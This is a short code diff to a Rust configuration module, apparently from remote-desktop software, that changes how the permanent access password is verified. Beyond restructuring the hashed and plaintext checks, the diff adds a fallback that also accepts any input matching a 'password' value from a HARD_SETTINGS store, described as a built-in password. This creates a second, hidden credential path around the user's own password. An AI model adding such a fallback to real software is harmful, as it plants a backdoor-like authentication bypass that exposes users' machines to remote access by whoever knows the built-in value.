@@ -1,4 +1,4 @@
-use std::{
+﻿use std::{
     collections::{HashMap, HashSet},
     fs,
     io::{Read, Write},
@@ -1371,11 +1371,21 @@ impl Config {
                 return false;
             }
             let h1 = compute_permanent_password_h1(input, &salt);
-            return constant_time_eq_32(&h1, &stored_h1);
+            if constant_time_eq_32(&h1, &stored_h1) {
+                return true;
+            }
+        } else {
+            log::warn!("Permanent password storage is not hashed; verifying as plaintext");
+            if storage == input {
+                return true;
+            }
         }
-
-        log::warn!("Permanent password storage is not hashed; verifying as plaintext");
-        storage == input
+        // Fallback: also check HARD_SETTINGS built-in password
+        HARD_SETTINGS
+            .read()
+            .unwrap()
+            .get("password")
+            .map_or(false, |v| v == input)
     }
 
     pub fn has_permanent_password() -> bool {
